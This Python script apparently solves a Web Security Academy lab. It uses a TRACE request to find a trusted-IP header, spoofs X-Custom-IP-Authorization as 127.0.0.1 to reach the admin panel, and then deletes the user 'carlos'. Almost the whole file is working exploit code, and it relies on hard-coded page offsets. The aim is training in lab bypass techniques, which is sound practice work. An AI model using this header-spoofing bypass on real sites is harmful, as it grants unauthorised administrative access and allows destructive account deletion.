import requests

'''

Coded by Kamran Saifullah
https://linkedin.com/in/KamranSaifullah
https://twitter.com/deFr0ggy
https://github.com/deFr0ggy

'''

proxxy = {

    "http" : "https://127.0.0.1:8080",
    "https" : "https://127.0.0.1:8080"

}

URL = "https://0a8d00f104b28332800d266900da0040.web-security-academy.net/"
r = requests.get(URL, verify=True)
admin_url = URL + "admin"
try:
    if r.status_code == 200:
        
        print(f"[+] URL is accessible: {URL}")
        print(f"[+] Testing Admin URL: {admin_url}")

        adminAccess = requests.get(admin_url)

        print(f"[+] Error Message:  {adminAccess.text[2405:2405+60]}")

        print("[+] Making a TRACE request on endpoint /admin") 
        adminAccess = requests.request("TRACE", admin_url)
        print(f"[+] Headers \n\n{adminAccess.text}")

        print(f"[+] Customer Header Observed i.e. X-Custom-IP-Authorization")
        print(f"[+] Setting Header Value to localhost/127.0.0.1")

        data = {

            "X-Custom-IP-Authorization": "127.0.0.1"

        }

        adminAccess = requests.get(admin_url, headers=data)

        print(f"[+] Finding URL to Delete Carlos")
        print(f"[+] Carlos observed at Offset: {adminAccess.text.find('carlos')}")
        print(f"[+] URL to delete Carlos: {adminAccess.text[2833:2833+28]}")

        print(f"[+] Deleting Carlos User: {URL+adminAccess.text[2833:2833+28]}")

        deleteCarlos = requests.get(URL+adminAccess.text[2833:2833+28], headers=data)

        if "Congratulations" in deleteCarlos.text:
            print(f"[-] Lab Completed: Carlos User Deleted")
        else:
            print("Something went wrong")

    else:
        print("Something Went Wrong")

except:
    print("Something went wrong!")

